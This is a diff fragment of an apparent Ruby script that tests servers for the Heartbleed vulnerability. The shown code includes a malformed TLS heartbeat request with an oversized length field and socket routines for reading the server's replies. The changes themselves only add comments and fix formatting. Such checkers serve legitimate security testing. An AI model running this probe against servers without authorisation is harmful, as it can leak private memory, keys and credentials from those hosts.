@@ -307,7 +307,7 @@ TLS_HANDSHAKE_PROTOCOL = [
 
 TLS_HEARTBEAT_PROTOCOL = [
   0x01,
-  0x40, 0x00,
+  0x40, 0x00
 ]
 
 # Assemble header and protocol data
@@ -319,12 +319,14 @@ TLS_HEARTBEAT = TLS_HEARTBEAT_HEADER.concat(TLS_HEARTBEAT_PROTOCOL).pack('C*')
 # Connection handling
 # ------------------------------------------------------------------------------
 
+# Read TLS record header type
 def read_tls_header_type (socket)
   header = socket.read(5)
   h_type, h_maj_version, h_min_version, h_length = header.unpack('CCCn')
   return h_type
 end
 
+# Read handshake type and silently discard protocol data
 def read_tls_handshake_type (socket)
   handshake = socket.read(4)
   hs_type, hs_length = handshake.unpack('CH6')
@@ -333,6 +335,7 @@ def read_tls_handshake_type (socket)
   return hs_type
 end
 
+# Read heartbeat data
 def read_tls_heartbeat_data (socket)
   heartbeat = socket.read(3)
   ht_type, ht_length = heartbeat.unpack('Cn')
@@ -346,7 +349,7 @@ def is_vulnerable?(host, port = 443)
   # Send ClientHello message
   s.write(TLS_HANDSHAKE)
 
-  # Wait for ServerHelloDone message
+  # Foolishly Wait for ServerHelloDone message
   while true
     if (read_tls_header_type(s) == 22) and (read_tls_handshake_type(s) == 14)
       break
@@ -373,6 +376,11 @@ def is_vulnerable?(host, port = 443)
 
   s.close()
 end
+
+
+# ------------------------------------------------------------------------------
+# Run
+# ------------------------------------------------------------------------------
 
 # Run the test
 if ARGV[1].nil?
